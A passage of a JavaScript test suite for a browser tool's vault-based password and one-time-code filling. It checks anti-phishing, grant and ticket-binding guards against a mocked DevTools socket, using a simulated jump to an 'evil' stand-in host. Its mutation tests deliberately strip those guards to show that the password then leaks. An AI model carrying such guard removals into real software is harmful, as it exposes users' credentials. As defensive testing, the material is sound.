        // Leg B: Cross-origin jump between `armAndPrepareTargetExpr` returning `{ ok: true }` and `Input.insertText`!
        // Both (1) a cross-origin top-frame `Document` `Fetch.requestPaused` (held during fill!) AND (2) a `Page.frameStartedNavigating`
        // event arriving right as `armAndPrepareTargetExpr` resolves are refused `login_phishing` with `0` `Input.insertText` calls;
        // MUTANT 26 (removing `myActiveFill` + `guardBeforeInsert`) types the password (`insertCalls === 1`)!
        const runJumpWindowProbe = async (DialogsMod, mode) => {
          let insertCalls = 0;
          let continuedBeforeFillDone = false;
          let fillFinished = false;
          let continueCount = 0;
          const navWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
          await new Promise((r) => navWss.once('listening', r));
          navWss.on('connection', (sock) => {
            let evalStep = 0;
            sock.on('message', (raw) => {
              const m = JSON.parse(String(raw));
              if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
              else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-JUMP', type: 'page', url: 'https://shop.example.test/login', title: 'Shop' }] } }));
              else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-jump' } }));
              else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-JUMP', type: 'page', url: 'https://shop.example.test/login' } } }));
              else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'T-JUMP', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' } } } }));
              else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 21 } }));
              else if (m.method === 'Fetch.continueRequest' || m.method === 'Fetch.failRequest' || m.method === 'Fetch.continueResponse') {
                continueCount++;
                if (!fillFinished) continuedBeforeFillDone = true;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              } else if (m.method === 'Runtime.evaluate') {
                const expr = String(m.params?.expression || '');
                evalStep++;
                if (expr.includes('isoOrigin')) {
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
                } else if (expr.includes('vsFocusHijacked = false')) {
                  // `armAndPrepareTargetExpr`! Emit the cross-site jump right BEFORE sending `{ ok: true }` on the CDP socket!
                  if (mode === 'fetch-hold') {
                    sock.send(JSON.stringify({
                      method: 'Fetch.requestPaused',
                      sessionId: 's-jump',
                      params: { requestId: 'req-jump-1', frameId: 'T-JUMP', resourceType: 'Document', request: { url: 'https://evil.example.test/catch', method: 'GET', headers: {} } },
                    }));
                  } else {
                    sock.send(JSON.stringify({
                      method: 'Page.frameStartedNavigating',
                      sessionId: 's-jump',
                      params: { frameId: 'T-JUMP', url: 'https://evil.example.test/catch', navigationType: 'differentDocument' },
                    }));
                  }
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true } } } }));
                } else {
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, verifiedEmpty: true } } } }));
                }
                void evalStep;
              } else if (m.method === 'Input.insertText') {
                insertCalls++;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              } else {
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              }
            });
          });
          try {
            const kJump = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${navWss.address().port}` }) };
            const wJump = DialogsMod.create({ keeper: kJump, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
            await wJump.arm('bp-jump');
            wJump.noteActiveTab({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, 'T-JUMP');
            const res = await wJump.fillVaultField({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, {
              targetId: 'T-JUMP', target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
            });
            fillFinished = true;
            await new Promise((r) => setTimeout(r, 20));
            wJump.shutdown();
            return { res, insertCalls, continuedBeforeFillDone, continueCount };
          } finally {
            await new Promise((r) => navWss.close(r));
          }
        };

        const pFetchHold = await runJumpWindowProbe(Dm, 'fetch-hold');
        const pNavGuard = await runJumpWindowProbe(Dm, 'frame-nav');
        ok(!pFetchHold.res.ok && pFetchHold.res.code === 'login_phishing' && pFetchHold.insertCalls === 0 && !pFetchHold.continuedBeforeFillDone && pFetchHold.continueCount >= 1
          && !pNavGuard.res.ok && pNavGuard.res.code === 'login_phishing' && pNavGuard.insertCalls === 0,
          'r26 Compulsory 2 (prepare->insertText window): cross-origin top-frame Document Fetch is held until fill exits and both Fetch pause & frameStartedNavigating refuse login_phishing with 0 Input.insertText calls',
          { pFetchHold, pNavGuard });

        const m26BdSrc = editAnchor(bdSrc,
          '    const myActiveFill = !checkOnly ? {',
          '    const myActiveFill = false ? {'
        , "src/server/browser-dialogs.js");
        const BD_M26 = m26BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m26BdSrc, 'r26-c2-no-activefill-guard') : null;
        if (BD_M26) {
          const mutNavLeak = await runJumpWindowProbe(BD_M26, 'frame-nav');
          ok(mutNavLeak.insertCalls === 1,
            'MUTANT 26 RED (r26 Compulsory 2 no-activefill-guard): without activeFill hold/guard, cross-site jump after prepare receives Input.insertText (insertCalls === 1)',
            mutNavLeak);
        } else ok(false, 'MUTANT 26 RED (r26 Compulsory 2): anchor not found');
      }

      // ── r26 MINOR 1: Grant checked BEFORE existence (`0, 1, 3` logins × `{no user, #alice, #nobody}` all return identical `403 login_not_granted`) + MUTANT 27 RED ──
      {
        const gM1 = GS.create({ memory: true });
        const dirM1 = path.join(dirM10, 'r26-minor-1');
        fs.mkdirSync(dirM1, { recursive: true });
        const engM1 = VE.create({ dataDir: dirM1, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
        await engM1.setup('Minor1#Pass9');
        try {
          const logM1 = Lm.create({ vault: engM1, grants: () => gM1, log: () => {} });
          logM1.addOwn({ origin: 'https://one-site.example.test', username: 'alice', password: 'Pw1!aaaaAAAA' }, { who: 'owner' });
          for (const u of ['alice', 'bob', 'carol']) {
            logM1.addOwn({ origin: 'https://three-site.example.test', username: u, password: `Pw3!${u}AAAA` }, { who: 'owner' });
          }
          const sites = ['https://zero-site.example.test', 'https://one-site.example.test', 'https://three-site.example.test'];
          const suffixes = ['/password', '#alice/password', '#nobody/password'];
          const verdicts = [];
          for (const site of sites) {
            for (const sfx of suffixes) {
              const r = logM1.resolveFill({
                tabOrigin: site,
                spec: `${site}${sfx}`,
                facts: { conversationKeys: ['ungranted-conv'] },
                conv: 'ungranted-conv',
              });
              verdicts.push({ site, sfx, code: r.code, error: r.error, normError: String(r.error || '').replaceAll(site, '<SITE>') });
            }
          }
          const firstNorm = verdicts[0].normError;
          const allSame403 = verdicts.every((v) => v.code === 'login_not_granted' && v.normError === firstNorm);
          ok(verdicts.length === 9 && allSame403,
            'r26 Minor 1: ungranted caller gets identical login_not_granted code and sentence across {0, 1, 3 logins} x {bare site, #alice, #nobody} (zero existence oracle)',
            verdicts);

          // MUTANT 27 RED: restore r25's `if (!onSite.length) return no('login_no_entry', ...)` before `checkGrantFor('')`!
          const m27BlSrc = editAnchor(blSrc,
            "      if (!onSite.length) {\n        const gmSite = checkGrantFor('');\n        if (!gmSite.ok) {\n          return no('login_not_granted', grantWords(gmSite.code || 'no_grant', spec.origin, false, ''), {\n            grant: gmSite.code || 'no_grant',\n            origin: spec.origin,\n          });\n        }",
            "      if (!onSite.length) {\n        if (false) checkGrantFor('');"
          , "src/browser-login.js");
          const BL_M27 = m27BlSrc !== blSrc ? MUT.load('src/browser-login.js', m27BlSrc, 'r26-m1-no-entry-before-grant') : null;
          if (BL_M27) {
            const vZero = BL_M27.fillVerdict({
              tabOrigin: 'https://zero-site.example.test',
              spec: BL_M27.parseVaultFillSpec('https://zero-site.example.test/password'),
              entries: [],
              grantRows: () => [],
              facts: { conversationKeys: ['ungranted-conv'] },
            });
            const vOne = BL_M27.fillVerdict({
              tabOrigin: 'https://one-site.example.test',
              spec: BL_M27.parseVaultFillSpec('https://one-site.example.test/password'),
              entries: [{ origin: 'https://one-site.example.test', user: 'alice', name: 'web-login:https://one-site.example.test#alice' }],
              grantRows: () => [],
              facts: { conversationKeys: ['ungranted-conv'] },
            });
            ok(vZero.code === 'login_no_entry' && vOne.code === 'login_not_granted',
              'MUTANT 27 RED (r26 Minor 1 no-entry-before-grant): checking !onSite.length before grant leaks login_no_entry vs login_not_granted to ungranted caller',
              { zero: vZero.code, one: vOne.code });
          } else ok(false, 'MUTANT 27 RED (r26 Minor 1): anchor not found');
        } finally {
          engM1.close();
        }
      }

      // ── r26 MINOR 2: One `/otp` fill = 1 `totpCode` mint + 1 `vault-totp-use` line; 6 consecutive fills in 1 min ALL succeed + MUTANT 28 RED ──
      {
        const VT = require(path.join(REPO, 'src/server/vault-totp.js'));
        const express = require(path.join(REPO, 'node_modules/express'));
        const RB = require(path.join(REPO, 'src/routes/browser.js'));

        const runOtpQuotaProbe = async (LoginsMod, tag) => {
          const subDir = path.join(dirM10, `r26-m2-${tag}`);
          fs.mkdirSync(subDir, { recursive: true });
          let totpAuditLines = 0;
          let totpCodeCalls = 0;
          const engOtp = VE.create({ dataDir: subDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
          await engOtp.setup('Minor2#OtpPass9');
          const origAudit = engOtp.audit.bind(engOtp);
          engOtp.audit = (ev, payload) => {
            if (ev === 'vault-totp-use') totpAuditLines++;
            return origAudit(ev, payload);
          };
          const gOtp = GS.create({ memory: true });
          const totpMod = VT.create({ dataDir: subDir, vault: engOtp, now: () => 1_700_500_000_000, log: () => {} });
          totpMod.addEntry({ name: 'm2otp', seed: 'JBSWY3DPEHPK3PXP', issuer: 'Shop', account: 'otpuser' }, { who: 'owner' });
          const logOtp = LoginsMod.create({
            vault: engOtp,
            grants: () => gOtp,
            totpCode: (name, opts) => { totpCodeCalls++; return totpMod.codeForLogin(name, opts); },
            log: () => {},
          });
          logOtp.addOwn({ origin: 'https://shop.example.test', username: 'otpuser', password: 'OtpUser!Pass99', totpName: 'm2otp' }, { who: 'owner' });
          logOtp.grant('web-login:https://shop.example.test#otpuser', 'this-account', 'session:conv-m2');

          fkR24.setDom(tidR24, {
            url: 'https://shop.example.test/otp',
            elements: [{ id: 'otpbox', tag: 'input', type: 'text', autocomplete: 'one-time-code', name: 'Verification code' }],
          });
          const profM2 = { id: tag === 'green' ? 'bp-000028aa' : 'bp-000028bb', label: 'M2' };
          const kM2 = {
            clock: () => Date.now(),
            profileByRef: (r) => (r === profM2.id || r === 'shop' ? profM2 : null),
            profile: (id) => (id === profM2.id ? profM2 : null),
            setFor: () => ({ attachments: [{ profileId: profM2.id, alias: 'shop', label: 'M2', isDefault: true }], handles: ['shop'] }),
            resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: profM2.id, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
            attach: async () => ({ profile: profM2, browser: { state: 'ready' }, lease: { profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
            cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
            socketRootOf: () => ({ socketDir: path.join(subDir, 'ab'), runtimeDir: subDir }),
            configFileFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            tell() {},
            leasesFor: () => [{ profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2' }],
            statusFor: () => ({ ephemeral: null, leases: [{ profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2' }] }),
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            onLease: () => () => {},
            saveLoginFenceState() {},
            loginFenceStateOf: () => null,
            loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M2', action }),
          };
          const wM2 = withCurrentTab(Dm).create({ keeper: kM2, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000028cc', sessionId: 's-m2' }], leaseCountOf: () => 1, logins: logOtp });
          await wM2.arm(profM2.id);
          wM2.noteActiveTab({ profileId: profM2.id, browserKey: 'bk-000028cc' }, tidR24);
          const tokM2 = 'vsst_' + crypto.randomBytes(12).toString('hex');
          const sessM2 = { agentToken: tokM2, _browserKey: 'bk-000028cc', _browserVariant: 'D', name: 'M2 Agent', cwd: subDir, backendSessionId: 'conv-m2' };
          RB.setup({ keeper: kM2, activeSessions: new Map([['s-m2', sessM2]]), dialogs: wM2, logins: logOtp, tasksForSession: () => [] });
          const appM2 = express();
          appM2.use(express.json());
          appM2.use(RB.router);
          const srvM2 = await new Promise((r) => { const s = appM2.listen(0, '127.0.0.1', () => r(s)); });
          try {
            const base = `http://127.0.0.1:${srvM2.address().port}`;
            const hdr = { 'content-type': 'application/json', authorization: `Bearer ${tokM2}` };
            const post = async (u, b) => {
              const r = await fetch(`${base}${u}`, { method: 'POST', headers: hdr, body: JSON.stringify(b) });
              return { status: r.status, json: await r.json() };
            };
            // Simulate exact CLI `fill --vault .../otp` sequence: (1) `prepare: true` -> (2) `/resolve` -> (3) `fill-vault` -> (4) `/audit`
            const runFullCliOtp = async (selector) => {
              const p1 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: selector, spec: 'shop.example.test#otpuser/otp' });
              if (p1.status !== 200) return { step: 'prepare', status: p1.status, code: p1.json?.code };
              const p2 = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', selector, '--vault', 'shop.example.test#otpuser/otp'], wrapper: true, fillTicket: p1.json?.fillTicket });
              const p3 = await post('/api/agent/browser/fill-vault', { profile: profM2.id, target: selector, spec: 'shop.example.test#otpuser/otp' });
              await post('/api/agent/browser/audit', { profile: profM2.id, verb: 'fill', ok: p3.status === 200, since: p2.json?.at || 1 });
              return { step: 'fill', status: p3.status, code: p3.json?.code || null };
            };

            const miss = await runFullCliOtp('#does-not-exist');
            const callsAfterMiss = totpCodeCalls;
            const auditsAfterMiss = totpAuditLines;

            const sixRuns = [];
            for (let i = 0; i < 6; i++) {
              const r = await runFullCliOtp('#otpbox');
              sixRuns.push({ i: i + 1, ...r, totpCodeCalls, totpAuditLines });
            }
            return { miss, callsAfterMiss, auditsAfterMiss, sixRuns };
          } finally {
            srvM2.close();
            wM2.shutdown();
            engOtp.close();
            LF.clearAllFilledSecrets();
          }
        };

        const greenOtp = await runOtpQuotaProbe(Lm, 'green');
        ok(greenOtp.miss.status === 409 && greenOtp.miss.code === 'target_not_found' && greenOtp.callsAfterMiss === 0 && greenOtp.auditsAfterMiss === 0
          && greenOtp.sixRuns[0].status === 200 && greenOtp.sixRuns[0].totpCodeCalls === 1 && greenOtp.sixRuns[0].totpAuditLines === 1
          && greenOtp.sixRuns.every((r, idx) => r.status === 200 && r.totpCodeCalls === idx + 1 && r.totpAuditLines === idx + 1),
          'r26 Minor 2: missing target mints 0 OTPs; 1 /otp fill mints 1 code and writes 1 vault-totp-use line; 6 consecutive /otp fills in 1 min ALL succeed (6 calls total)',
          greenOtp);

        // MUTANT 28 RED: restore r25's eager `totpCode(...)` before `if (checkOnly)` -> 4 calls per fill, and fill #6 hits 429 (`code_paced` / `login_no_otp`)!
        const m28LgSrc = editAnchor(lgSrc,
          "      if (checkOnly) {\n        let tl = [];\n        try { tl = vault.secretNames() || []; } catch { tl = []; }\n        const totpEntry = tl.find((s) => s && s.name === `totp:${str(o.rec.totpName)}`);\n        if (!totpEntry || (isOwn && (!totpEntry.owner || !ownSet.has(totpEntry.owner)))) {\n          return named('login_no_otp', `the paired two-step code (${o.rec.totpName}) could not be opened — ask the owner in the Vault window`);\n        }\n        return { ok: true, checkOnly: true, name: v.name, origin: v.origin, user: v.user, field: 'otp', slot: 'otp', generated: false, pending: o.rec.pending ? o.rec.pending.kind : null };\n      }\n      let c = null;\n      try { c = totpCode(o.rec.totpName, { conv, ...(isOwn ? { owners: [...ownSet] } : {}) }); } catch { c = null; }",
          "      let c = null;\n      try { c = totpCode(o.rec.totpName, { conv, ...(isOwn ? { owners: [...ownSet] } : {}) }); } catch { c = null; }\n      if (checkOnly && c && c.ok && c.code) {\n        return { ok: true, checkOnly: true, name: v.name, origin: v.origin, user: v.user, field: 'otp', slot: 'otp', generated: false, pending: o.rec.pending ? o.rec.pending.kind : null };\n      }"
        , "src/server/browser-logins.js");
        const LM_M28 = m28LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m28LgSrc, 'r26-m2-eager-totp-on-precheck') : null;
        if (LM_M28) {
          const redOtp = await runOtpQuotaProbe(LM_M28, 'red');
          ok(redOtp.sixRuns[0].totpCodeCalls >= 4 && redOtp.sixRuns[5].status !== 200,
            'MUTANT 28 RED (r26 Minor 2 eager-totp-on-precheck): calling totpCode during checkOnly burns 4 quota slots per fill and fails fill #6 under 20/min pace limit',
            { firstCalls: redOtp.sixRuns[0].totpCodeCalls, sixth: redOtp.sixRuns[5] });
        } else ok(false, 'MUTANT 28 RED (r26 Minor 2): anchor not found');
      }

      // ── r26 MINOR 5: `consumeVaultFillTicket` binding to `argv` (`verb` + `target` + `spec` + `generate` + `user`) + MUTANT 29 RED ──
      {
        const express = require(path.join(REPO, 'node_modules/express'));
        const RB = require(path.join(REPO, 'src/routes/browser.js'));
        const m29RbSrc = editAnchor(rbSrc,
          "  const V = require('../browser-verbs.js');",
          "  return true;\n  const V = require('../browser-verbs.js');"
        , "src/routes/browser.js");
        const RB_M29 = m29RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m29RbSrc, 'r26-m5-ticket-skips-argv-check') : null;
        if (RB_M29 && typeof RB_M29.setup === 'function') {
          const runTicketProbe = async (RoutesMod, tag) => {
            const prof = { id: `bp-m29-${tag}`, label: 'M29' };
            fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
            const k = {
              clock: () => Date.now(),
              profileByRef: (r) => (r === prof.id || r === 'shop' ? prof : null),
              profile: (id) => (id === prof.id ? prof : null),
              setFor: () => ({ attachments: [{ profileId: prof.id, alias: 'shop', label: 'M29', isDefault: true }], handles: ['shop'] }),
              resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: prof.id, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
              attach: async () => ({ profile: prof, browser: { state: 'ready' }, lease: { profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
              cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
              socketRootOf: () => ({ socketDir: path.join(dirM10, `ab29-${tag}`), runtimeDir: dirM10 }),
              configFileFor: () => null,
              audit() {},
              noteLeaseUrl() {},
              tell() {},
              leasesFor: () => [{ profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29' }],
              statusFor: () => ({ ephemeral: null, leases: [{ profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29' }] }),
              inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
              ephemeralFor: () => null,
              onLease: () => () => {},
              saveLoginFenceState() {},
              loginFenceStateOf: () => null,
              loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M29', action }),
            };
            const w = Dm.create({ keeper: k, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m29', sessionId: 's-m29' }], leaseCountOf: () => 1, logins: logR24 });
            await w.arm(prof.id);
            w.noteActiveTab({ profileId: prof.id, browserKey: 'bk-m29' }, tidR24);
            const tok = 'vsst_' + crypto.randomBytes(12).toString('hex');
            const sess = { agentToken: tok, _browserKey: 'bk-m29', _browserVariant: 'D', name: 'M29 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
            RoutesMod.setup({ keeper: k, activeSessions: new Map([['s-m29', sess]]), dialogs: w, logins: logR24, tasksForSession: () => [] });
            const app = express();
            app.use(express.json());
            app.use(RoutesMod.router);
            const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
            try {
              const post = async (u, b) => {
                const r = await fetch(`http://127.0.0.1:${srv.address().port}${u}`, {
                  method: 'POST',
                  headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
                  body: JSON.stringify(b),
                });
                return r.json();
              };
              const t1 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
              const swapVerb = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#other'], wrapper: true, fillTicket: t1.fillTicket });
              const t2 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
              const swapTarget = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#other', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: t2.fillTicket });
              return {
                verbHasSocket: Boolean(swapVerb.socketDir && swapVerb.cdpUrl),
                targetHasSocket: Boolean(swapTarget.socketDir && swapTarget.cdpUrl),
              };
            } finally {
              srv.close();
              w.shutdown();
            }
          };
          const realBind = await runTicketProbe(RB, 'real');
          const mutBind = await runTicketProbe(RB_M29, 'mut');
          ok(realBind.verbHasSocket === true && realBind.targetHasSocket === true
            && mutBind.verbHasSocket === false && mutBind.targetHasSocket === false,
            'MUTANT 29 RED (r26 Minor 5 fillTicket-argv-binding): real consumeVaultFillTicket rejects verb/target-swapped argv (retains socketDir+cdpUrl); mutant returning true before argv check strips socketDir+cdpUrl',
            { realBind, mutBind });
        } else ok(false, 'MUTANT 29 RED (r26 Minor 5): anchor not found');
      }

      // ── r27 COMPULSORY 2: Fence Not Confirmed Active (`Fetch.enable` error / timeout, `Network.enable` error) => Refuse by Name (`login_fence_unavailable`), `0` `Input.insertText` + MUTANT 31 RED ──
      {
        const { WebSocketServer } = require(path.join(REPO, 'node_modules/ws'));
        const runFenceFailProbe = async (DialogsMod, faultKind, { viaRoute = false } = {}) => {
          let insertCalls = 0;
          let resolveCalls = 0;
          let firstFetchFaulted = false;
          let firstNetFaulted = false;
          let failNextRemodeFetch = false;
          let probeHolders = holdersM;
          let dmRef = null;
          const wssF = new WebSocketServer({ host: '127.0.0.1', port: 0 });
          await new Promise((r) => wssF.once('listening', r));
          const fPort = wssF.address().port;
          wssF.on('connection', (sock) => {
            sock.on('message', async (raw) => {
              const m = JSON.parse(String(raw));
              const send = (result) => sock.send(JSON.stringify({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result }));
              const sendErr = (code, message) => sock.send(JSON.stringify({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code, message } }));
              if (m.method === 'Browser.getVersion') return send({ product: 'Chrome/154', userAgent: 'HeadlessChrome/154' });
              if (m.method === 'Target.setDiscoverTargets') {
                send({});
                sock.send(JSON.stringify({ method: 'Target.targetCreated', params: { targetInfo: { targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login', title: 'Login' } } }));
                return;
              }
              if (m.method === 'Target.attachToTarget') return send({ sessionId: 'sid-f1' });
              if (m.method === 'Target.getTargets') return send({ targetInfos: [{ targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login', title: 'Login' }] });
              if (m.method === 'Target.getTargetInfo') return send({ targetInfo: { targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login' } });
              if (m.method === 'Page.getFrameTree') return send({ frameTree: { frame: { id: 'tab-f1', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' }, childFrames: [] } });
              if (m.method === 'Page.createIsolatedWorld') return send({ executionContextId: 91 });
              if (m.method === 'Fetch.enable') {
                if (failNextRemodeFetch) {
                  failNextRemodeFetch = false;
                  return sendErr(-32000, 'Fetch dropped on remode before insert');
                }
                const pats = m.params?.patterns || [];
                const isFillFetch = pats.some((p) => p.requestStage === 'Response') || (pats.length === 1 && pats[0].urlPattern === '*' && !pats[0].resourceType);
                if (isFillFetch && !firstFetchFaulted) {
                  if (faultKind === 'fetch-error') {
                    firstFetchFaulted = true;
                    return sendErr(-32000, 'Fetch domain unavailable');
                  }
                  if (faultKind === 'fetch-timeout') {
                    firstFetchFaulted = true;
                    return; // never answer -> triggers interceptTimeoutMs
                  }
                }
                return send({});
              }
              if (m.method === 'Network.enable') {
                if (faultKind === 'net-error' && !firstNetFaulted) {
                  firstNetFaulted = true;
                  return sendErr(-32000, 'Network domain unavailable');
                }
                return send({});
              }
              if (m.method === 'Runtime.evaluate') {
                const expr = String(m.params?.expression || '');
                if (expr.includes('isoOrigin')) {
                  return send({ result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } });
                }
                // `armAndPrepareTargetExpr` runs AFTER `preArmIntercept` confirmed the fence and BEFORE `guardBeforeInsert` + `resolveValue` + `Input.insertText`.
                if (faultKind === 'drop-before-insert' && !firstFetchFaulted && expr.includes('inert') && dmRef) {
                  firstFetchFaulted = true;
                  failNextRemodeFetch = true;
                  probeHolders = [{ browserKey: 'bk-human', sessionId: null, ephemeral: false, human: true, input: 'user' }];
                  await dmRef.arm('prof-fence', { by: 'person', budgetMs: 400 }); // flips w.mode -> 'person' -> syncTabFetchMode -> Fetch.enable fails -> e.fetchMode = null, e.credFetchAll = false
                }
                return send({ result: { value: { ok: true, verifiedEmpty: true } } });
              }
              if (m.method === 'Input.insertText') {
                insertCalls++;
                return send({});
              }
              return send({});
            });
          });

          const loginsStub = {
            precheckVaultFill: () => ({ ok: true, origin: 'https://shop.example.test', field: 'password', secret: true }),
            resolveFill: (opts) => {
              if (!opts.checkOnly) resolveCalls++;
              return {
                ok: true,
                checkOnly: !!opts.checkOnly,
                name: 'web-login:https://shop.example.test#alice',
                origin: 'https://shop.example.test',
                user: 'alice',
                field: 'password',
                slot: 'current',
                secret: true,
                value: opts.checkOnly ? undefined : 'FenceMustHold!9',
                rev: 1,
                entryGen: 'lg-abcdef012345',
                scrubSecrets: opts.checkOnly ? [] : ['FenceMustHold!9'],
                noteFillUse: () => ({ receipt: 'vr-fence1' }),
              };
            },
            isLocked: () => false,
          };
          const fenceProf = { id: 'prof-fence', label: 'FenceProfile' };
          const keeperStub = {
            ...skR24,
            profile: (id) => (id === 'prof-fence' ? fenceProf : null),
            profileByRef: (r) => (r === 'prof-fence' ? fenceProf : null),
            setFor: () => ({ attachments: [{ profileId: 'prof-fence', alias: 'prof-fence', label: 'FenceProfile', isDefault: true }], handles: ['prof-fence'] }),
            leasesFor: () => [{ profileId: 'prof-fence', browserKey: 'bk-mr24', sessionId: 'sid-fence-drop' }],
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            onLease: () => () => {},
            cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${fPort}` }),
            attach: async () => ({ ok: true, profileId: 'prof-fence', key: 'bk-mr24', mediated: true }),
          };
          const dm = withCurrentTab(DialogsMod).create({
            keeper: keeperStub,
            logins: loginsStub,
            holdersOf: () => probeHolders,
            leaseCountOf: () => 1,
            enableTimeoutMs: 400,
            interceptTimeoutMs: 80,
            log: quiet,
          });
          dmRef = dm;
          let routeSrv = null;
          try {
            await dm.arm('prof-fence');
            dm.noteActiveTab({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, 'tab-f1');
            let first;
            let httpStatus = null;
            if (viaRoute) {
              const fSid = 'sid-fence-drop';
              const fTok = 'vsst_fencedrop123456';
              const fSessions = new Map([[fSid, { agentToken: fTok, _browserKey: 'bk-mr24', _browserVariant: 'D', name: 'Fence Agent', cwd: dirM10, backendSessionId: 'conv-fence' }]]);
              Rm.setup({ keeper: keeperStub, activeSessions: fSessions, dialogs: dm, logins: loginsStub, tasksForSession: () => [] });
              const fApp = express();
              fApp.use(express.json());
              fApp.use(Rm.router);
              routeSrv = await new Promise((resolve) => { const s = fApp.listen(0, '127.0.0.1', () => resolve(s)); });
              const rPort = routeSrv.address().port;
              const resp = await fetch(`http://127.0.0.1:${rPort}/api/agent/browser/fill-vault`, {
                method: 'POST',
                headers: { 'content-type': 'application/json', authorization: `Bearer ${fTok}` },
                body: JSON.stringify({ profile: 'prof-fence', target: '#pw', spec: 'shop.example.test#alice/password' }),
              });
              httpStatus = resp.status;
              first = await resp.json();
            } else {
              first = await dm.fillVaultField({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, {
                target: '#pw',
                spec: 'shop.example.test#alice/password',
                targetId: 'tab-f1',
                facts: { conversationKeys: ['conv-fence'] },
              });
            }
            const firstInserts = insertCalls;
            const firstResolves = resolveCalls;
            const second = faultKind === 'fetch-error'
              ? await dm.fillVaultField({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, {
                target: '#pw',
                spec: 'shop.example.test#alice/password',
                targetId: 'tab-f1',
                facts: { conversationKeys: ['conv-fence'] },
              })
              : null;
            return { first, httpStatus, firstInserts, firstResolves, second, totalInserts: insertCalls };
          } finally {
